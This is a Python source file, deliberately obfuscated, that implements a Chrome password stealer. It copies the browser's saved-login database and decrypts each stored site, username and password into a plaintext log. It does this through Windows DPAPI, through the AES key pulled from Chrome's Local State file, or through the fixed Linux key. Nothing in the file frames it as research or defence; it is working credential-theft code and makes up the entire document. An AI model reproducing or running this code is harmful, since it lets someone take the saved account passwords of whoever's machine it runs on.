import os #line:1
import sys #line:2
import shutil #line:3
import sqlite3 #line:4
import json ,base64 #line:5
from cryptography .hazmat .backends import default_backend #line:7
from cryptography .hazmat .primitives .ciphers import (Cipher ,algorithms ,modes )#line:8
class GetChromePass :#line:10
    def __init__ (OO00O0OO00O0O0O0O ):#line:11
        OO00O0OO00O0O0O0O .passwordlog =""#line:12
        OO00O0OO00O0O0O0O .APP_DATA_PATH =os .environ ['LOCALAPPDATA']#line:13
        OO00O0OO00O0O0O0O .DB_PATH =r'Google\Chrome\User Data\Default\Login Data'#line:14
        OO00O0OO00O0O0O0O .NONCE_BYTE_SIZE =12 #line:15
    def start (OOO0000O0O000O000 ):#line:17
        _O000O00O0O0000O0O =os .path .join (OOO0000O0O000O000 .APP_DATA_PATH ,OOO0000O0O000O000 .DB_PATH )#line:18
        _OO00OOOO0OOOO0OOO =os .path .join (OOO0000O0O000O000 .APP_DATA_PATH ,'sqlite_file')#line:19
        if os .path .exists (_OO00OOOO0OOOO0OOO ):#line:20
            os .remove (_OO00OOOO0OOOO0OOO )#line:21
        shutil .copyfile (_O000O00O0O0000O0O ,_OO00OOOO0OOOO0OOO )#line:22
        OOO0000O0O000O000 .show_password (_OO00OOOO0OOOO0OOO )#line:23
        return OOO0000O0O000O000 .passwordlog #line:24
    def show_password (OOO0OOOO0OO0O0OO0 ,OO0OOOO000OO0O0O0 ):#line:26
        OO000OOO00O0OOO00 =sqlite3 .connect (OO0OOOO000OO0O0O0 )#line:27
        _OOO0O0O0O0OOO0O0O ='select signon_realm,username_value,password_value from logins'#line:28
        for O0OOO0O0000O00000 in OO000OOO00O0OOO00 .execute (_OOO0O0O0O0OOO0O0O ):#line:29
            OOOO0O0O0000O0O00 =O0OOO0O0000O00000 [0 ]#line:30
            if OOOO0O0O0000O0O00 .startswith ('android'):#line:31
                continue #line:32
            OOOOO00OO00O00O0O =O0OOO0O0000O00000 [1 ]#line:33
            OO000OO00O0O00O00 =OOO0OOOO0OO0O0OO0 .chrome_decrypt (O0OOO0O0000O00000 [2 ])#line:34
            _O00OOO0OO0OO00OOO ='Site: %s\nUsername: %s\nPassword: %s\n\n'%(OOOO0O0O0000O0O00 ,OOOOO00OO00O00O0O ,OO000OO00O0O00O00 )#line:35
            OOO0OOOO0OO0O0OO0 .passwordlog +=_O00OOO0OO0OO00OOO #line:36
        OO000OOO00O0OOO00 .close ()#line:37
        os .remove (OO0OOOO000OO0O0O0 )#line:38
    def chrome_decrypt (OOOO00OOOOO0OO00O ,OO0OO0O000O00OO00 ):#line:40
        if sys .platform =='win32':#line:41
            try :#line:42
                if OO0OO0O000O00OO00 [:4 ]==b'\x01\x00\x00\x00':#line:43
                    O00O0OOOOOOO0O00O =OOOO00OOOOO0OO00O .dpapi_decrypt (OO0OO0O000O00OO00 )#line:44
                    return O00O0OOOOOOO0O00O .decode ()#line:45
                elif OO0OO0O000O00OO00 [:3 ]==b'v10':#line:46
                    O00O0OOOOOOO0O00O =OOOO00OOOOO0OO00O .aes_decrypt (OO0OO0O000O00OO00 )#line:47
                    return O00O0OOOOOOO0O00O [:-16 ].decode ()#line:48
            except WindowsError :#line:49
                return None #line:50
        else :#line:51
            try :#line:52
                return unix_decrypt (OO0OO0O000O00OO00 )#line:53
            except NotImplementedError :#line:54
                return None #line:55
    def encrypt (OO000O00O00OO0O0O ,OOO0O00OO0OO0OO0O ,OOOOOO000O0O000O0 ,O00OO0000000O0O00 ):#line:57
        OOO0O00OO0OO0OO0O .mode =modes .GCM (O00OO0000000O0O00 )#line:58
        OO0O0000O0OOO0O00 =OOO0O00OO0OO0OO0O .encryptor ()#line:59
        OO00000OO0OOOO0OO =OO0O0000O0OOO0O00 .update (OOOOOO000O0O000O0 )#line:60
        return (OOO0O00OO0OO0OO0O ,OO00000OO0OOOO0OO ,O00OO0000000O0O00 )#line:61
    def decrypt (O0O0O000O0O0O0OO0 ,O000O00OOOO0O000O ,OOO0O0O00O0O000O0 ,O0O000OOOOO00O000 ):#line:63
        O000O00OOOO0O000O .mode =modes .GCM (O0O000OOOOO00O000 )#line:64
        OOO0OO0OOO000000O =O000O00OOOO0O000O .decryptor ()#line:65
        return OOO0OO0OOO000000O .update (OOO0O0O00O0O000O0 )#line:66
    def get_cipher (O00O000OOOO0OOO00 ,O0OO0O0OO000OO0OO ):#line:68
        OOOOO000O0OOOO000 =Cipher (algorithms .AES (O0OO0O0OO000OO0OO ),None ,backend =default_backend ())#line:73
        return OOOOO000O0OOOO000 #line:74
    def dpapi_decrypt (OOO0O0OOO0OO00000 ,OOOO00OO000O0O00O ):#line:76
        import ctypes #line:77
        import ctypes .wintypes #line:78
        class O000O000OOO0000OO (ctypes .Structure ):#line:80
            _fields_ =[('cbData',ctypes .wintypes .DWORD ),('pbData',ctypes .POINTER (ctypes .c_char ))]#line:82
        O00O000OOO0O000O0 =ctypes .create_string_buffer (OOOO00OO000O0O00O ,len (OOOO00OO000O0O00O ))#line:84
        O00000O0O0O0OOOO0 =O000O000OOO0000OO (ctypes .sizeof (O00O000OOO0O000O0 ),O00O000OOO0O000O0 )#line:85
        O0OO00OOOOOO00O00 =O000O000OOO0000OO ()#line:86
        OOOOOO00OOO000OO0 =ctypes .windll .crypt32 .CryptUnprotectData (ctypes .byref (O00000O0O0O0OOOO0 ),None ,None ,None ,None ,0 ,ctypes .byref (O0OO00OOOOOO00O00 ))#line:88
        if not OOOOOO00OOO000OO0 :#line:89
            raise ctypes .WinError ()#line:90
        O0O0O00OO0O0O0OO0 =ctypes .string_at (O0OO00OOOOOO00O00 .pbData ,O0OO00OOOOOO00O00 .cbData )#line:91
        ctypes .windll .kernel32 .LocalFree (O0OO00OOOOOO00O00 .pbData )#line:92
        return O0O0O00OO0O0O0OO0 #line:93
    def unix_decrypt (O0OO00O000OOO00OO ,O00OOO0O0OOO000OO ):#line:95
        if sys .platform .startswith ('linux'):#line:96
            O0OOOO0O0OO00OOO0 ='peanuts'#line:97
            OO00O00000OO00O0O =1 #line:98
        else :#line:99
            raise NotImplementedError #line:100
        from Crypto .Cipher import AES #line:102
        from Crypto .Protocol .KDF import PBKDF2 #line:103
        OO00O0O00OOO000OO ='saltysalt'#line:105
        O00000OOOOO0O0000 =' '*16 #line:106
        OO0OOO00000OOOO00 =16 #line:107
        OOO0OOOO00O00O0O0 =PBKDF2 (O0OOOO0O0OO00OOO0 ,OO00O0O00OOO000OO ,OO0OOO00000OOOO00 ,OO00O00000OO00O0O )#line:108
        O000O0000OOO00OOO =AES .new (OOO0OOOO00O00O0O0 ,AES .MODE_CBC ,IV =O00000OOOOO0O0000 )#line:109
        O0O0O00O000OOO000 =O000O0000OOO00OOO .decrypt (O00OOO0O0OOO000OO [3 :])#line:110
        return O0O0O00O000OOO000 [:-ord (O0O0O00O000OOO000 [-1 ])]#line:111
    def get_key_from_local_state (O0OOOOO0OOOOO00OO ):#line:113
        O00OO0O00OO0O00OO =None #line:114
        with open (os .path .join (os .environ ['LOCALAPPDATA'],r"Google\Chrome\User Data\Local State"),encoding ='utf-8',mode ="r")as OO00O00O000OO0O00 :#line:115
            O00OO0O00OO0O00OO =json .loads (str (OO00O00O000OO0O00 .readline ()))#line:116
        return O00OO0O00OO0O00OO ["os_crypt"]["encrypted_key"]#line:117
    def aes_decrypt (OO0O000O0OO0O000O ,O00O00O0OOOOO0OOO ):#line:119
        O0O0OO00OO000OO00 =OO0O000O0OO0O000O .get_key_from_local_state ()#line:120
        O00O0O0O0O0OO00O0 =base64 .b64decode (O0O0OO00OO000OO00 .encode ())#line:121
        O00O0O0O0O0OO00O0 =O00O0O0O0O0OO00O0 [5 :]#line:122
        OOO0O0O0000OOOOOO =OO0O000O0OO0O000O .dpapi_decrypt (O00O0O0O0O0OO00O0 )#line:123
        O00OO00O000O00OO0 =O00O00O0OOOOO0OOO [3 :15 ]#line:124
        O00OOO00O0O00OOO0 =OO0O000O0OO0O000O .get_cipher (OOO0O0O0000OOOOOO )#line:125
        return OO0O000O0OO0O000O .decrypt (O00OOO00O0O00OOO0 ,O00O00O0OOOOO0OOO [15 :],O00OO00O000O00OO0 )